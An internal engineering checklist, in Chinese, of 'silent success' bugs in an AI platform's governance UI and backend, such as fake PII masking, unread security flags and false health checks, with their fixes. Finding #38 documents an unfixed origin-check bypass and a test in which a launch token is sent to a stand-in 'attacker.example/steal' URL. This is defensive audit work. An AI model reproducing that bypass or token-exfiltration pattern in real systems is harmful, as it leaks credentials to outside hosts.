# 假控制項清單:按了、沒報錯、什麼也沒發生

> **這份清單只收「靜默成功」**——使用者做了某個動作、看不到任何錯誤、以為成功了,實際上沒有。
> 會報錯的 bug 不在這裡(報錯是誠實的)。
>
> **為什麼單獨立一份**:2026-07-30 一天內偶然撞到兩個(分享的「指定人」、「交給同事」),
> 兩個都已經上線一段時間、都沒有人發現。擁有者要求把其餘的**主動找出來**,
> 而不是等下一次偶然。三個角度平行掃:酬載對照 / 後端空轉 / 死控制項。
>
> **排序**:碰到分類、分享、權限、稽核的一律最前面,不管使用頻率——
> 「以為鎖了其實沒鎖」在四級密等的軍網場域是最貴的錯覺。
>
> 標記 ✅**已驗證** = 指揮官親自追過兩端程式碼;其餘為掃描回報,修之前請再確認。
>
> ⚠ **2026-08-01 P2.1**：agent 派工身分已改短效 JWT；下文若提到從 `.env` 拿掉
> `CSP_SERVICE_TOKEN`／舊版 token 汰換卡，屬當時假控制項紀錄，**勿當成現行 agent 上手步驟**
> （現行見 `docs/guides/developer-guide.md`）。

---

## 最高:讓人以為資料被保護了

### 1. ✅ PII「遮罩」不會遮罩——原文照樣送進模型

- **畫面說**:`trust.jsx:178` 「送出時將自動遮罩」
- **實際**:`chat.jsx:1779` 送出的 `body` 是**原文**;`piiHits`(偵測到的位置)被
  `runtime/messageTree.js:53` 的註解明白標為 **client-only fields**——它從來沒離開瀏覽器。
  遮罩只發生在**你自己畫面上的顯示**。
- **三個模式的真相**:`block` 真的擋(`chat.jsx:1383`)、`warn` 真的警告、**`mask` 是假的**。
- **後果**:使用者打了身分證號、看到畫面上變成 `A12****789`、以為送出的是遮罩版,
  **完整號碼進了模型、也進了對話紀錄**。
- **修法方向**(不是解答):要嘛在送出前真的替換 `body`,要嘛把文案改成誠實的
  (「僅在本畫面遮蔽顯示,送出內容不變」)。**前者是功能、後者是一行字**,先做後者止血。

### 2. Agent `classification_ceiling`:收得到、回得出、**從來沒存進去**

- `api/agents/registration.py:153` 宣告在 schema、`:207` 在回應裡回傳,
  但**沒有任何一行把它寫進 Agent 物件**。
- ⚠ **報告把這條的嚴重度講高了,實測要修正**:密等防線**沒有**全面空轉——
  **模型**的 ceiling 寫得進去(`models.py:301` / `:1535`)也真的在擋(`proxy/ceiling.py:91`),
  而 `enforce_model_ceiling` 本來就只判模型。agent 真正在用的密等是 G9 的
  `default_classification_level`(有寫入、有 latch、今晚剛修過競態)。
  所以這是一個**收了就丟的殘留欄位**,不是破掉的防線。
- ⚠ **這條有指揮官的責任**:它是 OE-2 稽核早就記錄的 B2(「現況全樹無寫入,防線恆 no-op」),
  而 2026-07-30 派 OE-1 時明寫「保留 `classification_ceiling`,不要動它」——
  保住了欄位,卻沒要求補上寫入路徑。
- **修法方向**:要嘛補寫入並接進 enforce,要嘛**刪掉這個欄位**。
  收了就丟比沒有更糟,因為它讓人以為設定了。

### 3. 分享的 `mode` / `allow_fork`:寫進資料庫、零授權效果

隨 P4.3 已大幅改善(具名分享已上線),但這兩個欄位仍存而不用。**確認 P4.3 之後是否還有殘留**。

---

## 高:讓維運者以為系統是好的(假綠燈)

### 4. Agent「測試連線」:**不是 401 就算接對了**

- **這正是 2026-07-30「hi 沒有回覆」拖了那麼久才查出來的原因**:
  那台 gateway 先驗金鑰再看路由,所以連 `/v1/v1/models` 這種錯路徑也回 401。
  測試連線只證明「主機活著」,**證明不了路徑對**。
- 使用者拿到綠燈、以為設定好了,實際每一則訊息都 404。

### 5. Agent/模型「健康檢查」:命中 `/` 且 `<500` 就標 healthy

同一種假綠燈。探測清單裡有 `/`,而 `/` 幾乎永遠回東西。

### 6. `ENABLE_API_DOCS`:設定宣告可以關,**程式從來沒讀過它**

維運者以為自己關掉了 API 文件。(P2.3 已從另一條路真的關掉 router 的,但這個旗標本身是死的。)

### 7. 服務 `healthcheck_url`:UI 宣稱會探測,**零讀取**

### 8. Admin「執行設定」`runtime_config`:寫入回 200、宣稱 30 秒生效,**生產 agent 無人輪詢**
→ **已修**(wt/csk-cleanup):PATCH 維持 410;治理 UI 改唯讀並移除儲存/清除按鈕;
agent 端 `GET /me/runtime-config`（HISTORICAL: removed）與 `RuntimeConfigPoller` 一併移除(零生產呼叫點)。

### 8b. Agent 長效 `csk-`／`bsk-` 後端發行面(治理 UI 已拆、API 仍核發)

治理中心不再提供「核發 agent 憑證」按鈕,但後端仍接受
`issue-bootstrap`／`bootstrap`／`credentials/issue-static`／`rotate` 與
`GET .../credentials/me`(Tier-1 輪替偵測)。Q19 留下一顆低權限 agent 憑證的
兩個前提(runtime-config 自拉、撤銷清單)分別是「已拆」與「agent 端從未建、
且撤銷端點拒絕 `kind=agent`」——發行面成為無人消費的死路,卻仍能造出長效祕密。
→ **已修**(wt/csk-teardown Task 2+4):上列 agent 端點一律 **410**;
`anila-core agent bootstrap` exit 1;admin `GET/DELETE .../credentials` 保留清 orphan;
`POST /api/service-clients/{id}/issue-static` 不動(平台內部 s2s)。

---

## 中:日常會遇到,但不涉及安全

### 9. 對話**星號 / 資料夾 / 標籤**:只改前端 state,重載就沒了

程式碼註解自稱會寫進 `ui_settings`,實際沒接。這條**每天都會咬人**,而且修法便宜。

### 10. Handoff `accept`:改狀態＋發通知,**但不移交對話**(API 空殼)

### 11. Agent 註冊「版本」:UI 送 `version`,後端只認 `agent_version`,**靜默丟棄**

### 12. 服務註冊「網址」:前端送 `url`,schema 要 `entry_url` → **更新靜默丟棄**
(同一次請求裡的密等/角色**會**寫入,所以更像「存好了」)

### 13. 模型 `protocol`(`custom_adapter`):可存,proxy 不讀

### 14. Agent `capabilities` JSON:可編輯回存,執行路徑不閘

---

## 已知且刻意(不是缺陷)

- `shadow` 註冊旗標 / CLI draft:OE-1 收斂七態→三態時刻意忽略。

---

## 掃描範圍與信心

- **酬載對照**:粗掃約 55 個寫入點,確認 6、排除 49。
- **後端空轉**:確認 13。
- **死控制項**:第三輪掃描中,回來後追加。
- 三個角度都被要求**兩端都追到 file:line 才准報**,並先查 PLAN 不重報已排程項目。

## 建議的處理順序

1. **第 1 條先改文案**(一行字,今天就能止血),功能再排。
2. **第 2 條決定「補寫入」還是「刪欄位」**——不要留著。
3. **第 4、5 條一起修**:收緊成功條件。這兩條是「為什麼缺陷那麼晚才被發現」的答案,
   修它們等於提高之後所有問題的偵測率。
4. 第 9 條(星號/資料夾/標籤)雖然不涉安全,但**每天咬人且便宜**,值得早做。

---

## 第三輪(死控制項角度)追加 —— 2026-07-31 凌晨

確認 7 項、追進去後排除約 17 項(其中一項原本排第一名,讀了接收端才發現是誤判)。

### ✅ 已修:治理中心編權限——讀取失敗被吞掉,存檔變成靜默全撤 **(今晚最嚴重的一條)**

**沒有人做錯任何事就會發生。** 管理員點開「可用模型」,前端先清空、然後 `try { 讀取 } catch {}`
(空的 catch)。讀取失敗一次(逾時/500/網路抖動),清單停在空的,視窗照常打開、**每個框都沒勾**
——跟「這個人本來就沒有權限」在畫面上無法分辨。管理員勾了想加的那一個、按儲存,
後端**全量取代**(`users.py:295` 先 delete 再重建)、**再連帶把被撤掉的模型從該使用者所有 API key
移除**(`:304`)。畫面回報綠色成功,稽核看起來就是一次正常管理操作。
→ **已修**(`93465c5`):讀不到現況就不開視窗並說明原因。Agent 權限同一形狀,一併修。
→ 已確認其餘 `catch {}` 都在**輪詢迴圈**裡(下一輪會重試、不餵給寫入),那是正確的。

### 其餘六項(未修,依嚴重度)

| # | 事情 | 為什麼算靜默 |
|---|---|---|
| 1 | **服務登記編「網址」永遠不生效** | 前端送 `url`,schema 只有 `entry_url`,Pydantic 靜默丟棄;名稱/圖示/排序都存了,只有網址沒存。**同一個後端的舊相容門面 `platform_links.py:103` 有做這個轉換**,證明是漏做不是設計 |
| 2 | **對話的標籤/資料夾/星號從未送到後端** | 三個動作只改 React state(`app.jsx:898`),`Conversation` 模型根本沒有這些欄位。**資料夾清單本身有存,對話歸進哪個沒存**——重新登入後資料夾都在但全是空的 |
| 3 | **比較模式「採用此回答」只存在瀏覽器記憶體** | 建了一個純前端的假對話(`app.jsx:2112`),重整就沒。⚠ 加重:這段會把該對話標成 `classified`,等於**列管內容被採用進一個伺服器不知道存在的對話**,沒有 latch、沒有留存、沒有稽核 |
| 4 | **比較模式「重新產生」綁空函式** | `multiagent.jsx:146` `onRegenerate={() => {}}`,選單四個選項點了都沒事。一般聊天模式下這個 prop 是真的 |
| 5 | **儀表板抓取失敗時 KPI 顯示 0** | `|| 0` 落點,長得像「真的沒有流量」。註解說「錯誤會由 alert center 呈現」——**那句話是錯的**,攔截器只處理 401 |
| 6 | **舊版 token 汰換卡片永遠「載入中…」** | `v-else` 綁的是資料不是 loading flag,抓取失敗就永遠停住。⚠ 它是唯一告訴管理員「可不可以從 `.env` 拿掉 `CSP_SERVICE_TOKEN`」的畫面 |

### 另列(會報錯,不屬本類但等於功能不能用)

- **「新增服務」直接 422**:必填 `entry_url` 前端送成 `url`,**沒有人能從 UI 新增註冊服務**。與上表第 1 項同源。
- **API 金鑰頁「建立」用假理由鎖住自己**:讀取失敗 → 顯示「允許清單中沒有模型 · 請聯絡管理員」。
  **有理由的 disabled,但理由是錯的**——使用者去找管理員,管理員看到權限明明就在。
- 兩處空狀態指向不存在的路徑 `/admin/platform-links`(實際是 `/platform-links`)。


---

## 2026-07-31 凌晨 · 清理結果

**26 項裡有 13 項已處理。** 判準始終是同一句:**收了設定卻丟掉,比不提供這個設定更糟**——
設不了的人知道自己設不了,設了卻被忽略的人**以為自己受到保護**。

七項的清尾全部選擇「拿掉」而不是「接上去」,而且不是靜默忽略,是**明確拒絕**(422／410／501),
呼叫端會被告知:

| 項目 | 處置 |
|---|---|
| `ENABLE_API_DOCS` | 移除(宣告了但沒人讀,維運者會以為自己關掉了文件) |
| 服務 `healthcheck_url` | 移除;帶入即 422 |
| Admin `runtime_config` | 寫入路徑 410;治理 UI 改唯讀並拿掉儲存鈕;`GET /me` + poller 移除(沒有 agent 在輪詢) |
| Agent `classification_ceiling` | **只拿掉收了就丟的表面**(回應/序列化/UI,帶入 422);**DB 欄位、`enforce_agent_ceiling`、G9 全部不動** |
| Agent `capabilities` | 移除可編輯面,不加執行閘 |
| 模型 `custom_adapter` | 移除,下拉只留 `openai_compatible` |
| Handoff `accept` | ~~501 誠實拒絕~~ → **2026-07-31 真的做出來了**(見下) |

**另外三項今晚稍早已修**:PII 遮罩文案、治理中心權限靜默全撤、「交給同事」按鈕。

### 「交給同事」整條補回來(2026-07-31,擁有者答了 Q9)

原本是**兩段都假**:送出端沒有 `to_user_id`(交給「沒有人」),接受端只翻狀態不移交對話。
兩段一起補才有意義——只補送出端等於把同一個缺陷換個形狀。

- 新增 `GET /api/directory/users`(`services/csp/app/api/directory.py`):全院可查,
  回應模型只宣告 `id / username / department` 三個欄位。**不是**放寬 `GET /api/users`。
- `accept` 真的把 `conversations.user_id` 換成接收者,並自動幫原擁有者補一筆
  不過期的具名分享(`services/csp/app/services/handoff_transfer.py`)。
- 密／機密(> 營業秘密)的對話**建立與接受兩端都擋**,判準沿用具名分享的
  `outbound_action_allowed`。
- 收件人端有 UI 可以按(`collab.jsx` 的 `HandoffInbox`,掛在 `banners.jsx`)——
  沒有這塊,送出的請求一樣沒有人按得到「接受」。
- 行為測試在 `services/csp/tests/test_handoff_transfer.py` 與
  `apps/anila-shell/src/__tests__/handoffColleague.test.jsx`,每個 class 標了
  「改哪一行會轉紅」。

### 新增一項(壓力測試踩到,已修)

**`auto_seed` 覆寫管理員編輯**(OE-2 的 B3,早就排了):
`AUTO_REGISTER_MODELS` 清單裡的模型,端點在**每次開機時被無條件蓋回環境變數的值**——
三個地方都有同樣的覆寫(一般模型、agent 模型、agent registry)。
管理員在治理中心改了端點、看到成功、**下次部署悄悄變回去**。
壓力測試就是這樣被咬的:改過的 embedding 端點被重啟蓋回去,整輪 sweep 全 502。
→ 已修:env 只負責建立不存在的列,既有列歸管理員。

### 還沒處理

- 服務登記編網址／新增服務 → **已於 wt/govfix 修好**
- 對話星號／資料夾／標籤只在本機 → **已修**(`fb8d7a1`/`0c262d2`,每人一份 meta)
- 比較模式「採用此回答」→ **已修**(現在走伺服器,密等由伺服器決定)
- 比較模式「重新產生」綁空函式 → **已修**(`bdf739c`,沒有 handler 就不畫按鈕)
- 儀表板失敗顯示 0／永遠載入中 → **已修**

---

## 第二輪(2026-07-31 早)——又找到四個,其中一個是全新的形狀

前一輪自稱處理 13 項,實際是 **15 項以上**(上面兩條被記成「進行中／未處理」但其實做完了)。
反過來,以下四項是**漏掉的**:

### #27 ~~治理中心的「Router 主模型」根本沒接線~~ ✅ **已修，本節保留為紀錄**

> ⚠ **2026-08-05 更正:下面這段描述已經不成立,而且它在 08-05 害我對擁有者講錯話。**
> 擁有者說「我指定 Gemma,平台就會回答」——**擁有者是對的**。實測證據見下。

**當初的描述(已過時)**:模型頁可以把某個模型標成 `is_router_primary`,
router 完全不讀這個欄位,只讀環境變數 `MODEL`。管理員換了模型、看到成功、什麼也沒發生。

**現況(2026-08-05 實測)**:**接線了,而且會生效。** 兩套獨立機制指向同一支 CSP 端點:
`router_server.py:735-778` 的 `refresh_router_model`,以及 `main.py:227-234` 的 `_apply_primary`
(它直接改寫行程內的 `settings.model`)。解析點在 `router_server.py:723-726`——
**CSP 指定的名字優先於環境變數**,任一機制生效即可。

實測:用正式 admin API 把主路由從 `gemma26` 換成 `gemma26-nothink`,
trace 從 `Proxy -> gemma26` 變成 `Proxy -> gemma26-nothink`,`token_usage` 的 `model_id` 跟著換;
換回來,又變回去。環境變數 `MODEL` 只是**冷啟動的退路**,CSP 回答過一次之後就再也不用。

📌 **這一條最值得記的不是結論,是為什麼會誤判**:
`router_server.py:701-710` 有一段註解在**描述修好之前的狀態**,而它就寫在修正程式的正上方
(那是「為什麼要修」的理由)。**只讀那段註解、再看一眼容器的環境變數,就會得到完全相反的結論。**
→ **修好一個缺陷之後,講述舊狀態的註解要標明那是歷史**,否則它會被當成現況引用。

⚠ 順帶一個**沒過時**的事實:`is_router_primary` 同時是授權決定——
`api_key_service.py:125` 讓主路由模型對**每一個啟用中的使用者**開放,不需要逐列授權。
指定主路由不只是選路由,也是開權限。

### #28 API 金鑰頁的空 `catch{}` —— 跟「今晚最嚴重那個」是同一個形狀

`ApiKeysView.vue:196-199` 讀取失敗被空 catch 吞掉 → 畫面顯示
「允許清單中沒有模型 · 請聯絡管理員」(`:185`),**跟「這個人本來就沒有權限」長得一模一樣**。
治理權限那個修了,**這個沒有人記得**。同一個 bug 在第二個畫面上活著。

### #29 agent「版本」欄位兩端都壞

UI 送 `version`,後端 schema 只收 `agent_version` 且沒有 `extra="forbid"` → **靜默丟棄**;
回應回 `agent_version`,UI 讀 `agent.version` → 詳情頁永遠顯示「—」。
開發者填了版本、沒有任何錯誤、東西不見了。

### #30 兩個連到不存在路由的連結

`ServiceAccessView.vue:68`、`DashboardView.vue:147` 指向 `/admin/platform-links`,真實路由不是這個。

**#28–#30 已開工(wt/govclean),#27 等 core-opt 合併後隨路由那批一起修。**

---

## 第三輪(2026-08-03)——模型登錄的假控制與假紅燈

### #31 ✅ `api_version`（v1／v2）看起來像協定，其實只換 URL 路徑前綴

- **畫面說**：治理中心模型頁「API 版本」下拉 v1／v2，像在選通訊協定。
- **實際**：proxy 只把路徑改成 `/v1/...` 或 `/v2/...`（`proxy/service.py`、
  `proxy.py` 串流）；**送出的 body 與回應解析完全相同**。更糟的是維度探測
  曾硬編碼 `/v1/embeddings`，與 `api_version=v2` 的呼叫路徑對同一模型各說各話。
- **schema**：曾是任意 `str`，打錯字可靜默寫入，下游只有 v1／v2 有意義。
- **現況**：
  - 探測改走 `proxy_request`，與 live 路徑共用 `api_version`／`protocol`。
  - schema 收成 `v1`｜`v2`；治理 UI 標明「URL 路徑前綴，不是通訊協定」。
  - **保留 v2 選項**（庫內已有 `api_version='v2'` 列）；不把它重載成
    Triton——Triton 走獨立的 `protocol=triton_grpc`。

### #32 ✅ Triton gRPC 模型健康檢查永遠紅（假紅燈）

- **實際**：`probe_model_health_detailed` 對 gRPC port 發 httpx GET
  `/health`、`/v1/models`、`/` → 全失敗 → `unhealthy`＋告警「模型離線」，
  即使 Triton `ServerLive`／`ModelReady` 都正常。
- **後果**：工作中的模型長期顯示異常，訓練維運者忽略紅燈——比壞掉的模型更糟。
- **現況**：sweep／手動重測帶入 `protocol`＋`model_name`；`triton_grpc` 改探
  Triton gRPC（及 `grpc.health.v1`），不再對 gRPC port 做 HTTP 探測。

### #33 ✅ Triton gRPC 模型的「模型金鑰 · api key」欄位送不出去

- **畫面說**：`protocol=triton_grpc` 的模型登錄表單照樣顯示「模型金鑰 · api key」，
  輸入後存檔跳成功;列表列還標示「使用全域金鑰」。
- **實際**：Triton 路徑從不呼叫 `resolve_model_gateway_key` / `_apply_gateway_auth`
  （只有 HTTP 分支 `proxy/service.py:545` 會），`triton_grpc/client.py` 也沒有
  掛 call credentials 或 metadata。**一個 byte 都沒有送出去。**
- **後果**：管理員以為這個 Triton 端點有金鑰保護,實際上是裸的。
  這正是「使用者以為鎖住了存取但沒有」那一類。
- **現況**：`ModelsView.vue` 在該協定下**不顯示**金鑰欄位;先在別的協定下打過字
  再切協定的殘值會在 `buildModelPayload()` 丟掉;列表列改顯示「不使用金鑰」。
  端點提示同時說明本協定不送金鑰。

### #34 ✅ 公開 `/v1`、`/v2` embeddings 對外沒有 query／document 開關

- **畫面說**（對開發者）：CSP 的 embeddings 是 OpenAI 相容端點,送什麼進去就編碼什麼。
- **實際**：兩個路由都硬寫 `embedding_input_role="document"`,行程外呼叫端
  （含平台自己的 anila-agent SDK）**無法**表示自己是查詢側。對 Triton 類 embedder,
  查詢與文件走不同輸入張量 → 每一次 agent RAG 查詢都被當文件編碼,
  **不會報錯**,只是排序悄悄變差（實測 cosine 0.828 → 1.0）。
- **現況**：兩個路由接受 `input_type`（`query`／`document`,沿用 Cohere/Voyage/Jina
  慣例）,不帶維持 `document`,打錯字回 400 不靜默退回;該欄位不會轉送到上游。
  `anila_pgvector.search` 改帶 `query`;`memory/recall.py` 原本把
  `[query, *documents]` 併成一批送 —— 拆成兩次呼叫,一次 query 一次 document。

### #35 ⚠ `input_type` 送到 `nv-embed-proxy` 會被照單全收然後丟掉

- **文件說**:`packages/anila-agent/README.md:72`（`.en.md:76` 同）教人設
  `ANILA_EMBED_BASE_URL=http://nv-embed-proxy:8000/v1`。#34 之後,
  `memory/recall.py` 與 `retrieval/anila_pgvector.py` 都會在 body 裡帶
  `input_type`,看起來查詢側就有了。
- **實際**:那個 URL 指的是 **model 容器**,不是 CSP。
  `infra/models/src/embedding_proxy/app.py` 的 `EmbeddingRequest` 沒有宣告
  這個欄位,pydantic 預設 `extra="ignore"` → **不會 400,也不會被讀**;
  該 shim 對 Triton 一律送 `{"name": "documents", "shape": [1, N]}`。
  也就是說:欄位送得出去、不會壞,但查詢仍舊被當文件編碼。
- **後果**:照 README 設定的 agent,RAG 查詢的排序照舊悄悄變差,
  而呼叫端沒有任何訊號說它的 `input_type` 沒人理。
- **現況**:**尚未修**,先記在這裡。要真的拿到 query/document 分流,
  `ANILA_EMBED_BASE_URL` 要指向 **CSP** 的 `/v1`,且該 embedding model 在模型頁
  以 `protocol=triton_grpc` 註冊(runbook §3.1c)——那條路徑有測試把關
  (`services/csp/tests/test_triton_grpc_wire.py`)。
  沒有改 shim 的理由:`infra/models/` 是另一套獨立 build 的 model stack,
  本樹沒有任何測試會跑到它,改了也沒有人驗得到——那正是這份清單在收的東西。
  兩個 README 與 `recall.py` 的 docstring 已就地註明這個差異。

### #36 ✅ runbook 叫操作者調的 `EMBEDDING_TIMEOUT` 到不了容器

- **文件說**:runbook §3.1c 排錯表(以及 `triton_grpc/client.py` 兩則逾時錯誤
  訊息)叫操作者「調高 `EMBEDDING_TIMEOUT`」;`services/csp/.env.example` 也列著
  `EMBEDDING_TIMEOUT=30`。
- **實際**:`infra/compose/platform.yml` 的 csp 區塊沒有這一行,而整棵樹
  **沒有任何 `env_file:`** —— compose 只把「列舉出來的」環境變數放進容器,
  `.env` 本身不會整包灌進去。實測:`.env` 設了值 `docker compose config` 零命中,
  `docker exec anila-restart-csp-1 printenv EMBEDDING_TIMEOUT` 空、rc=1。
- **後果**:操作者照著 runbook 改 `.env`、`up -d csp`,**什麼都沒有改變**,
  而且沒有任何錯誤訊息 —— 502 照舊,他會以為是別的原因。
  這與 #34 之前 `ANILA_ALLOW_GRPC_ENDPOINT` 的形狀是同一個(旗標到不了容器),
  也是這份清單裡「按了沒反應」那一類最貴的變體:**指示本身是假的**。
- **現況**:`platform.yml` csp 區塊補上
  `EMBEDDING_TIMEOUT: "${EMBEDDING_TIMEOUT:-30}"`(預設值與 `Settings` 同),
  根目錄 `.env.example` 補上該鍵與說明,runbook 加了「調高 EMBEDDING_TIMEOUT」
  小節(含 `printenv` 驗證那一步)。
  `services/csp/tests/test_compose_csp_env_passthrough.py` 把「文件叫人去設的
  旋鈕 → csp 環境區塊有直通」整組釘住,免得第三次再犯。

---

## 第四輪(2026-08-05)——ASR 遠端化順帶清掉的一條

### #37 `ASR_ALLOW_HTTP_DECODER` —— 宣告了一個安全旗標,**沒有任何程式在讀**(已退役)

- **看起來是什麼**:`.env.example:218`、`infra/compose/platform.yml`、`infra/compose/dev.yml`
  都宣告 `ASR_ALLOW_HTTP_DECODER=0`,名字讀起來像「預設不准解碼端走純 http」。
  `services/asr-gateway/app/config.py` 也有對應欄位。
- **實際**:**零讀取**。`ASR_ALLOW_HTTP_DECODER` 在整個 repo 只出現在宣告處,
  沒有任何一行程式碼查詢它。`services/asr-gateway/tests/test_ws.py` 甚至有一條
  測試明白斷言「這個旗標不再擋任何東西」,而 `config.py:24-27` 的註解自承
  它是為了讓舊 .env 還能解析才留著。設成 0 的維運者會以為自己關掉了 http。
- **這一條的形狀**:不是「按了沒反應」,是**「以為鎖住了其實沒鎖」**——
  跟本清單最前面那一類同源,所以即使它只是一個環境變數也要記。
- **處置(2026-08-05)**:**拿掉**,不是接上去。http 的放行決定本來就已經由
  `ANILA_ALLOW_HTTP_ENDPOINT` 擁有(PLAN.md P0.2 拍板),ASR 沒有理由有第二個
  旗標——兩個旗標對同一件事表態,遲早會不一致,而不一致的那一天沒有人會發現。
  同一批把 asr-gateway 的解碼位址接進 `anila_core` 的 `validate_outbound_url`,
  所以「http 准不准」現在跟其他 model endpoint 走同一道門、同一個旗標。
- **舊 `.env` 留著那一行不會壞**(pydantic-settings 只對顯式 kwargs forbid extra)。
- **補登(同日,審查抓到)**:退役當下**文件沒清乾淨**。
  `services/asr-decoder/docker-compose.standalone.yml:14` 與
  `services/asr-decoder/README.md:61` 仍在教維運者「gateway 端設
  `ASR_ALLOW_HTTP_DECODER=1`」—— 而那兩個檔正是**遠端解碼端部署時唯一會被讀到
  的**。照著做的人得到的是「設了、沒報錯、gateway 照樣在啟動時拒收 http 位址」,
  也就是這一條原本要消滅的那個形狀。
  **教訓:退役一個假控制項,要把指向它的文件一起改掉才算退役完** —— 否則假控制項
  只是從程式碼搬進了文件,而文件比程式碼更難被測試抓到。兩處已改成
  `ANILA_ALLOW_HTTP_ENDPOINT=1`。

---

## 第五輪(2026-08-05)——專案入口磁貼的驗收帶出來的

### #38 ✅ 空的 `allowed_origins` 不是「不准」,是「全部都准」——launch token 直接送出去 🔴

- **畫面說**:治理中心的服務登記有一格 `allowed_origins`(iframe 來源允許清單)。
  管理員留白 → 直覺是「我沒有授權任何外部來源」。
- **實際**:`services/csp/app/api/services.py:185` 是

  ```python
  if allowed and origin not in allowed:   # ← allowed 是空的就整條跳過
  ```

  空清單是 falsy,**整個比對被略過**。於是一筆 `entry_url` 指向任意外部主機、
  `allowed_origins` 留白的服務,啟動時會把 **launch token 併進那個外部網址發出去**,
  一格檢查都不做。
- **實測(2026-08-05,本機 pytest)**:`entry_url="https://attacker.example/steal"`
  + `allowed_origins=[]` + `is_public=True` → `POST .../launch` 回 **200**,
  `launch_url = "https://attacker.example/steal?launch_token=eyJhbGciOiJSUzI1NiIs…"`。
- **誰會踩到**:只有**從資料庫/建立 API 生出來**的服務。env 種子那條路安全——
  `auto_seed.py:74,84` 對絕對 URL 一律回填 `allowed_origins=[origin]`。
  但建立端點 `services.py:280` 是 `data.get("allowed_origins") or []`,**預設就是空的**。
  → 管理員用治理中心新增一個外部服務,不填那格,就是這個狀態。
- **不是新的**:這一行與 `be969f99`(base)逐位元組相同,`wt/fix-launch-tiles` 沒有動它。
  記在這裡是因為它在該包的驗收中被翻出來,**免得下次有人當成新的迴歸再查一遍**。
- **修法方向**(不是解答,動之前要先問):把空清單當成「不准跨主機」是最直覺的,
  但那會**擋掉同源相對路徑**——同源那條路本來就靠「`allowed_origins` 空的時候放行」
  在走(見 `_validate_launch_entry_url` 的註解)。所以不能只把 `allowed and` 拿掉,
  要分域:同源(`_SAME_ORIGIN`)空清單放行,跨主機空清單則 fail closed。
  ⚠ 這會讓**現存**的、留白的跨主機登記全部停掉,是個 breaking change,
  要先盤點資料庫裡有幾筆、並且給管理員一條看得懂的錯誤訊息。

### #39 設定壞掉的服務,對沒有授權的人回 400 而不是 404

- `services.py` 的 launch 端點裡,`_validate_launch_entry_url` 排在 `can_access_service`
  **之前**。所以一個 `entry_url` 壞掉的服務,對一個**根本沒有授權**的人會回
  `400 服務 entry_url 必須是 http(s) URL` ——同時洩漏「這個 id 存在」與「它設定壞了」,
  而正常的拒絕應該是與「id 不存在」同形的 404。
- **不是靜默成功**,嚴重度也低(要先有一筆壞掉的登記);記在這裡是因為它與
  #31 同屬 launch 端點的順序問題,而且 `services.py` 的 release gate 註解引用了這一條。
- **不是新的**:base 就是這個順序。`wt/fix-launch-tiles` 只把 release gate 與
  `is_active` 兩道移到驗證之前(修掉「停用+相對路徑回 400」那個),沒有動驗證本身的位置。
- **修法方向**:把 `_validate_launch_entry_url` 移到 access gate 之後、
  `create_service_launch` 之前。改動很小,但會動到既有測試對 400 的期待,要一起看。
